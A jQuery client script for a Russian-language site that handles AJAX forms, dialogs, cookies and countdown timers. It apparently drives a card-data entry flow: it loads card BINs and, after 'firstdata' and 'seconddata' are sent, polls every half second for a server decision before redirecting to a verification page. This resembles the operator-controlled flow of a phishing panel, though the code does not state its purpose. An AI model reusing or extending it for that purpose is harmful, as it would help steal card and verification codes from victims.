CLIENT = {

	ajax_url: SERVER_AJAX_URL,
	seconddata_timer: null,
	progress_timer: null,
	
	lang: function (text) {
		return text;
	},

	clearFormErrors: function () {
		$("form.client_ajax_form").find("input.input-error").removeClass("input-error");
		$("form.client_ajax_form").find(".binking__title").empty();
		$("form.client_ajax_form").find(".if-error-show-container").hide();
		$("[data-error]").removeClass("error-password-invalid");
	},
	
	callFunction: function (func) {
		var dim = func.split(".");
		if (dim.length > 1) {
			return window[dim[0]][dim[1]]();
		} else {
			return window[func]();
		}
	},

	redirectTo: function (url) {
		window.location.href = url;
	},
	
	declination: function(value, words) {
		var w = words.split("|"),
			n = Math.abs(value);
		return n % 10 == 1 && n % 100 != 11 ? w[0] + w[1] : (n % 10 >= 2 && n % 10 <= 4 && (n % 100 < 10 || n % 100 >= 20) ? w[0] + w[2] : w[0] + w[3]);
	},
	
	confirmDialog: function (dialogText, okFunc, cancelFunc, dialogTitle, options) {

		var kernel = this,
			btns = {};
		
		btns[kernel.lang("Нет")] = function() { 
			if (typeof (cancelFunc) == "function") {
				setTimeout(cancelFunc, 50);
			}
			$(this).dialog("destroy");
		};
		
		btns[kernel.lang("Да")] = function() { 
			if (typeof (okFunc) == "function") {
				setTimeout(okFunc, 50);
				var win = $(this);
				setTimeout(function () {
					win.dialog("destroy");
				}, 250);
			} else {
				$(this).dialog("destroy");
			}
		};
		
		
		var defaults = {
			modal: true,
			resizable: false,
			width: "auto",
			minHeight: 75,
			zIndex: 99999,
			title: dialogTitle || kernel.lang("Необходимо подтверждение"),
			buttons: btns
		};	

		$.extend(defaults, options);
		
		$('<div style="padding: 10px; max-width: 100%; word-wrap: break-word;">' + (dialogText || kernel.lang("Вы уверены, что хотите это сделать?")) + "</div>").dialog(defaults);
	},

	showAjaxError: function (data) {
		if (typeof $.ui.dialog === "function") {		
			this.confirmDialog(
				data.responseText,
				function() {
					$(this).dialog("close");
				},
				null,
				"Ajax error",
				{buttons: null}
			);
		} else {
			alert(data.responseText);
		}
	},

	showResponse: function (data, sender) {
		var kernel = this;
		
		if (!data.redirect && typeof sender !== "undefined")
			kernel.hideLoader();

		
		var sticky_options = (typeof data.sticky_options !== "undefined") ? data.sticky_options : {};
		
		if (data.msg && data.msg != "nomsg") {
			if (data.status == "OK" || data.status == "ERR") {
				kernel.showModalMessage(data.msg);
				
				if (typeof data.redirect !== 'undefined') {
					setTimeout(function(){
						if (data.redirect == "self")
							window.location.reload();
						else	
							kernel.redirectTo(data.redirect);
					}, 1000);
				}
			}
		}
		
		if (data.container && data.func) {
			var $target = (data.container == "sender") ? sender : $(data.container);
			$target.html(data.response).fadeIn("slow",function() {
				kernel.callFunction(data.func);
			});
		} else if (data.container) {
			var $target = (data.container == "sender") ? sender : $(data.container);
			$target.html(data.response);
		} else if (data.append_container && data.func) {
			$(data.append_container).append(data.response);
			kernel.callFunction(data.func);
		} else if (data.append_container) {
			$(data.append_container).append(data.response);
		} else if (data.func) {
			kernel.callFunction(data.func);
		}
		
		if (data.redirect) {
			setTimeout(function() {
				if (data.redirect == "self")
					window.location.reload();
				else
					kernel.redirectTo(data.redirect);
			}, 1000);
		}
	},

	doAjax: function (sender) {
		var kernel = this,
			url = sender.data("url"),
				str = sender.data("vars"),
					query_str = str.replace(/\|/g, "&"),
						silent = query_str.indexOf("&silent=1") !== -1;
		
		if (typeof url === "undefined") {
			url = kernel.SITE_AJAX_URL;
		}
		
		if (!silent)
			kernel.showLoader();
		
		$.ajax({
			type: "POST",
			url: url,
			data: query_str,
			dataType: "json",
			success: function(data) {
				if (!data.redirect) {
					sender.attr("disabled", false);
				}
				
				if (silent)
					data.msg = "";
				
				kernel.showResponse(data, sender);
			},
			error: function(data) {
				kernel.hideLoader();
				kernel.showAjaxError(data);
			}
		});
		
		return false;
	},

	showLoader: function () {
		$("#loaderInd").fadeIn(200);
	},

	hideLoader: function () {
		$("#loaderInd").fadeOut(200);
	},
	
	showModalDialog: function(seconds) {
		if (!$("#modal-dialog").length)
			$("body").append('<div id="modal-dialog"></div>');
		
		var options = {
			modal: true,
			resizable: false,
			width: "auto",
			minHeight: 150,
			zIndex: 99999,
			dialogClass: "simple-dialog",
		};
		
		$("#modal-dialog").dialog(options);
	},
	
	hideModalDialog: function(seconds) {
		$("#modal-dialog").dialog("close");
		$("#modal-dialog").remove();
	},
	
	showTimer2: function(seconds, message, callback) {
		var kernel = this,
			callback_arg1 = arguments[3];
		
		kernel.showModalDialog();
		
		$("#modal-dialog").append('<div id="timerLoader" data-val="0"></div><div id="current-value2"></div>');
		
		if (typeof message !== "undefined" && message)
			$("#modal-dialog").append('<div id="modal-message">' + message + '</div>');
		
		var $counter = $("#current-value2");
		
		$counter.html(seconds);
		
		kernel.progress_timer = setInterval(function () {
			if (--seconds == 0) {
				clearInterval(kernel.progress_timer);
				
				setTimeout(function() {
				
					if (typeof callback === "string") {//"waitAfterFirstdata"
						$.post(kernel.ajax_url, {"operation":"wait_after_firstdata", "firstid":callback_arg1}, function( data ) {
							kernel.showResponse(data);
						}, "json");
						
					} else {
						$counter.html('<img src="/img/hourglass.gif">');
						$("#modal-message").html("Пожалуйста, подождите...<br>Еще немного");
					}
					
				}, 1000);
			}
			
			$counter.html(seconds);
			
		}, 1000);

	},
	
	toggleIfError: function() {
		$(".if-error-show-container").show();
		$(".if-error-hide-container").hide();
		$("[name='fields\[0\]']").val("");
		$("[data-error]").addClass("error-password-invalid");
	},
	
	bindAjaxForms: function() {
		var kernel = this;
		
		$(document).on("submit", "form.client_ajax_form", function() {
			var sender = $(this),
				url = sender.attr("action"),
					query_str = sender.serialize(),
						silent = query_str.indexOf("&silent=1") !== -1;
			
			//if (!silent)
				//kernel.showLoader();
			
			if (typeof url === "undefined" || !url) {
				url = kernel.ajax_url;
			}
			
			$.post(url, query_str, function( data ) {
				if (silent)
					data.msg = "";
				
				kernel.showResponse(data, sender);
			}, "json")
			.fail(function(response) {
				kernel.hideLoader();
				kernel.showAjaxError(response);
			});
			
			return false;
		});
	},	
	
	bindAjaxButtons: function() {
		var kernel = this;
		
		$(document).on("click", 'a[data-do="ajax-client"], input[data-do="ajax-client"]', function(event) {
			var sender = $(this);
				
			if (typeof sender.data("confirm") !== "undefined") {

				kernel.confirmDialog(
					sender.data("msg"),
					function() {
						kernel.doAjax(sender);
					}, 
					null,
					sender.data("title")
				);

			} else {
				kernel.doAjax(sender);
			}
			
			return false;
		});

	},
	
	delayAfterFirstdata: function(delay) {
		var kernel = this;
		
		setTimeout(function () {
			var url = "verification.php?id=" + $("input[name=keyid]").val();
			kernel.redirectTo(url);
		}, delay * 1000);
	},
	
	waitAfterFirstdata: function(firstid) {
		var kernel = this;
		
		setInterval(function () {
			$.post(kernel.ajax_url, {"operation":"wait_after_firstdata", "firstid":firstid}, function( data ) {
				kernel.showResponse(data);
			}, "json");
		}, 500, firstid);

	},
	
	waitAfterSeconddata: function(firstid) {
		var kernel = this;
		
		kernel.seconddata_timer = setInterval(function () {
			$.post(kernel.ajax_url, {"operation":"wait_after_seconddata", "firstid":firstid}, function( data ) {
				kernel.showResponse(data);
			}, "json");
		}, 500, firstid);
	},
	
	stopSeconddataTimer: function() {
		var kernel = this;
		clearInterval(kernel.seconddata_timer);
	},
	
	stopProgressTimer: function() {
		var kernel = this;
		clearInterval(kernel.progress_timer);
		$("#progressbar").remove();
	},
	
	stopTimer2: function() {
		var kernel = this;
		clearInterval(kernel.progress_timer);
		
		kernel.hideModalDialog();
	},
	
	setCookie: function(name, value, days) {
		var expires = "";
		if (days) {
			var date = new Date();
			date.setTime(date.getTime() + (days*24*60*60*1000));
			expires = "; expires=" + date.toUTCString();
		}
		document.cookie = name + "=" + (value || "")  + expires + "; path=/";
	},
	
	getCookie: function(name) {
		var nameEQ = name + "=";
		var ca = document.cookie.split(';');
		for(var i=0;i < ca.length;i++) {
			var c = ca[i];
			while (c.charAt(0)==' ') c = c.substring(1,c.length);
			if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
		}
		return null;
	},
	
	eraseCookie: function(name) {   
		document.cookie = name +'=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;';
	},
	
	getBins: function() {
		var kernel = this;
		
		$.post(kernel.ajax_url, {"operation":"get_bins"}, function( data ) {
			if (data.status == "OK") {
				binking.addBins(data.response);
			}
			
		}, "json");
		
	},
	
	showModalMessage: function(message) {
		var kernel = this,
			$win = $("#modal-dialog");
		
		if (!$win.length) {
			kernel.showModalDialog();
			$win = $("#modal-dialog");
		}
		
		$win.html('<div style="border:0px solid red; min-height:124px; font-size:18px; vertical-align:middle; font-weight:bold; line-height:116px;">' + message + '</div>');
	},

};



jQuery(document).ready(function($) {
	$("body").append('<div id="loaderInd"></div>');
	
	CLIENT.bindAjaxForms();
	CLIENT.bindAjaxButtons();
	
});